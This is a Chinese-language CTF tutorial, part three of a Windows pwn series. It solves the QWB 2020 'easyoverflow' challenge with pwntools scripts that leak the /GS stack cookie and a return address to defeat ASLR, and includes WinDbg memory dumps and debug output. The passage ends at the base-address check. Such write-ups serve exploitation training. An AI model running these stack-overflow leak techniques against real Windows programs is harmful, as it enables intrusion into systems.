> 上两节都是保护机制几乎都没开的情况下，这一节就开始学习绕过ASLR和GS
之前的文章链接：
  * [win pwn初探（一）](https://xz.aliyun.com/t/11865)
  * [win pwn初探（二）](https://xz.aliyun.com/t/11891)
# win pwn初探（三）
这里以强网杯2020的[easyoverflow](https://github.com/z1r00/ctf-pwn/blob/main/winpwn/QWB2020/easyoverflow.zip)来练习学习
## 查看保护
没有开SafeSEH和CFG，其他重要的保护都开了
## 程序分析
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      FILE *v3; // rax
      FILE *v4; // rax
      FILE *v5; // rax
      int v6; // ebx
      char DstBuf[256]; // [rsp+20h] [rbp-118h] BYREF
      v3 = _acrt_iob_func(0);
      setbuf(v3, 0i64);
      v4 = _acrt_iob_func(1u);
      setbuf(v4, 0i64);
      v5 = _acrt_iob_func(2u);
      setbuf(v5, 0i64);
      v6 = 3;
      do
      {
        --v6;
        memset(DstBuf, 0, sizeof(DstBuf));
        puts("input:");
        read(0, DstBuf, 0x400u);
        puts("buffer:");
        puts(DstBuf);
      }
      while ( v6 > 0 );
      return 0;
    }
这个程序很简单，read这里的DstBuf，可以输入0x400大小的数据，而DestBuf是256的空间，所以存在一个栈溢出漏洞
## 漏洞利用
### 泄露StackCookie
在CTF的PWN中，因为有canary的存在，所以先泄露出canary，再泄露出程序基地址，最后利用ret2libc3即可攻击成功
在win中的利用也很相似，首先需要泄露出`StackCookie`这个东西，看一下汇编，这个东西是怎么放入程序的一些地址中的
    push    rbx
    sub     rsp, 130h
    mov     rax, cs:__security_cookie
    xor     rax, rsp
    mov     [rsp+138h+var_18], rax
在程序开头会将`__security_cookie`放入rax，然后与rsp进行异或，之后把异或的结果（`StackCookie`）存放在`rsp +
138h + var_18`中，再看一下程序的最后
    xor     eax, eax
    mov     rcx, [rsp+138h+var_18]
    xor     rcx, rsp        ; StackCookie
    call    __security_check_cookie
    add     rsp, 130h
    pop     rbx
    retn
程序结束前会把`rsp + 138h +
var_18`里面的值给到rcx，也就是把上面`__security_cookie`与rsp异或之后的值给rcx，然后再经过一次异或（这样的话`StackCookie`的值就会回到`__security_cookie`），最后与`__security_cookie`进行比较，如果相等则继续，不相等则crash掉
先构造以下poc测试一下
    from pwn import *
    context.log_level = 'debug'
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    r = remote('10.211.55.3', 1234)
    pause()
    p1 = b'a' * 8
    r.sendlineafter('input:', p1)
    r.interactive()
然后在`puts("buffer:");`这里下个断点，之后看一下rsp的布局
    0:000> dq rsp
    000000ee`9973f840  00000000`00000000 00000000`00000000
    000000ee`9973f850  00000000`00000000 00000000`00000002
    000000ee`9973f860  61616161`61616161 00000000`0000000a
    000000ee`9973f870  00000000`00000000 00000000`00000000
    000000ee`9973f880  00000000`00000000 00000000`00000000
    000000ee`9973f890  00000000`00000000 00000000`00000000
    000000ee`9973f8a0  00000000`00000000 00000000`00000000
可以看到8个a已经被写入，上面的`StackCookie`会存到`rsp + 0x138 - 0x18`中，所以看一下
    0:000> dq rsp + 0x138 - 0x18
    000000ee`9973f960  00005fb0`2d14eecc 00000000`00000000
    000000ee`9973f970  000002e8`94297480 00007ff6`71ad12f4
    000000ee`9973f980  000000ee`9973f9e0 00007ff6`71ad136d
此时程序的StackCookie是`00005fb0
2d14eecc`这个值也就是`0x5fb02d14eecc`，看一下输入的buf距离这个地址多少，`ee9973f960 - ee9973f860 =
0x100`，所以编写poc泄露出`StackCookie`
    from pwn import *
    context.log_level = 'debug'
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    r = remote('10.211.55.3', 1234)
    pause()
    p1 = b'a' * 0x100
    r.sendlineafter('input:', p1)
    r.recvuntil('a' * 0x100)
    r.recvuntil('\n')
    StackCookie = u64(r.recv(6).ljust(8, b'\x00'))
    li('StackCookie = ' + hex(StackCookie))
    r.interactive()
调试一下看一下泄露的是否正确
    0:000> dq rsp + 0x130 - 0x18
    00000057`f0bcfc88  61616161`61616161 00002447`1d701f43
    00000057`f0bcfc98  00000000`00000000 00000185`4bf47480
    00000057`f0bcfca8  00007ff6`637112f4 00000057`f0bcfd10
    00000057`f0bcfcb8  00007ff6`6371136d 00000000`00000000
    00000057`f0bcfcc8  00000000`00000000 00000000`00000000
可以看到`StackCookie`的值是`0x24471d701f43`
    [DEBUG] Received 0x119 bytes:
        00000000  62 75 66 66  65 72 3a 0d  0a 61 61 61  61 61 61 61  │buff│er:·│·aaa│aaaa│
        00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
        *
        00000100  61 61 61 61  61 61 61 61  61 43 1f 70  1d 47 24 0d  │aaaa│aaaa│aC·p│·G$·│
        00000110  0a 69 6e 70  75 74 3a 0d  0a                        │·inp│ut:·│·│
        00000119
    StackCookie = 0x24471d701f43
poc里面`StackCookie`和上面调试的一样
### 泄露binary base
因为这个程序三次循环，只要最后的StackCookie正确就不会crash，所以第二次可以泄露出程序的基地址，也就是覆盖rbp，后面就会连带返回值一起泄露出来，poc如下
    from pwn import *
    context.log_level = 'debug'
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    r = remote('10.211.55.3', 1234)
    pause()
    p1 = b'a' * 0x100
    r.sendafter('input:', p1)
    r.recvuntil('a' * 0x100)
    StackCookie = u64(r.recv(6).ljust(8, b'\x00'))
    li('StackCookie = ' + hex(StackCookie))
    p2 = b'a' * 0x118
    r.sendafter('input:' ,p2)
    r.recvuntil('a' * 0x118)
    leak_addr = u64(r.recv(6).ljust(8, b'\x00'))
    li('leak_addr = ' + hex(leak_addr))
    r.interactive()
运行即可成功泄露出返回地址，此时就可以算出binary base
    from pwn import *
    context.log_level = 'debug'
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    r = remote('10.211.55.3', 1234)
    pause()
    p1 = b'a' * 0x100
    r.sendafter('input:', p1)
    r.recvuntil('a' * 0x100)
    StackCookie = u64(r.recv(6).ljust(8, b'\x00'))
    li('StackCookie = ' + hex(StackCookie))
    p2 = b'a' * 0x118
    r.sendafter('input:' ,p2)
    r.recvuntil('a' * 0x118)
    leak_addr = u64(r.recv(6).ljust(8, b'\x00'))
    li('leak_addr = ' + hex(leak_addr))
    binary_base = leak_addr - 0x12F4
    li('binary_base = ' + hex(binary_base))
    r.interactive()
debug细节如下
    [DEBUG] Received 0x131 bytes:
        00000000  62 75 66 66  65 72 3a 0d  0a 61 61 61  61 61 61 61  │buff│er:·│·aaa│aaaa│
        00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
        *
        00000120  61 f4 12 4c  0c f6 7f 0d  0a 69 6e 70  75 74 3a 0d  │a··L│····│·inp│ut:·│
        00000130  0a                                                  │·│
        00000131
    leak_addr = 0x7ff60c4c12f4
    binary_base = 0x7ff60c4c0000
算出`binary_base = 0x7ff60c4c0000`，验证一下是否正确，直接看windbg前面的信息
    Executable search path is: 